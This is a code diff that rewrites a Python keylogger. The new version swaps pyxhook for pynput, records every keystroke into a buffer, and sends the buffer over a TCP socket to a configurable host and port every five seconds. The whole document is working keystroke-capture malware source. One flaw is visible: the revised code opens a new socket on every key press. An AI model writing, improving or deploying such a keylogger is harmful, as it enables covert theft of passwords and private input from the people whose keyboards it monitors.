@@ -1,56 +1,49 @@
-
-def keylog(HOST = "127.0.0.1", PORT = 5004):
-
-    import pyxhook
+def keylog(HOST,PORT):
+    from pynput import keyboard
     import socket
     import time
+    import threading
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((HOST, PORT))
-    s.setblocking(0)  # Set to non-blocking I am testing the keylogger
+    state = {
+        "buffer": "",
+        "socket": None
+    }
 
-    buffer = ""
+    def on_press(key, st):
+        try:
+            st["buffer"] += key.char
+        except AttributeError:
+            if key == keyboard.Key.space:
+                st["buffer"] += ' '
+            elif key == keyboard.Key.enter:
+                st["buffer"] += '\n'
+            elif key == keyboard.Key.backspace and st["buffer"]:
+                st["buffer"] = st["buffer"][:-1]
+            else:
+                st["buffer"] += f'<{key}>'
 
-    def OnKeyboardEvent(event):
-        nonlocal buffer  # Access the global buffer variable
+        st["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        st["socket"].connect((HOST, PORT))
 
-        if event.Key == 'space':
-            buffer += ' '  # Use += for string concatenation
-        elif event.Key == 'Return':
-            buffer += '\n'
-        elif event.Key == "BackSpace":
-            buffer = buffer[:-1] #removes last character
-        else:
-            buffer += event.Key
+    def send_buffer(st):
+        while True:
+            time.sleep(5)
+            if st["buffer"]:
+                st["socket"].sendall(st["buffer"].encode("utf-8"))
+                st["buffer"] = ''
 
-        print(buffer)
-        return True
-    
-    # Create a new HookManager instance testing
-    hm = pyxhook.HookManager()
+    # we can use a lambda or partial to capture 'st':
+    from functools import partial
+    listener = keyboard.Listener(on_press=partial(on_press, st=state))
+    listener.start()
 
-    # Set the hook for key down events
-    hm.KeyDown = OnKeyboardEvent
+    t = threading.Thread(target=send_buffer, args=(state,), daemon=True)
+    t.start()
 
-    # Start hooking the keyboard
-    hm.HookKeyboard()
+    listener.join()
 
-    # Start the hook manager's monitoring loop in a separate thread. Thus
-    hm.start()
+if __name__ == '__main__':
+    HOST = "127.0.0.1"
+    PORT = 5004
 
-    while True:
-        time.sleep(5)
-        if(buffer != ''):
-            print("sending buffer")
-            s.send(buffer.encode('utf-8'))
-            buffer = ''
-
-if __name__ == "__main__":
-    keylog()
-            
-        
-    
-
-
-
-
+    keylog(HOST,PORT)
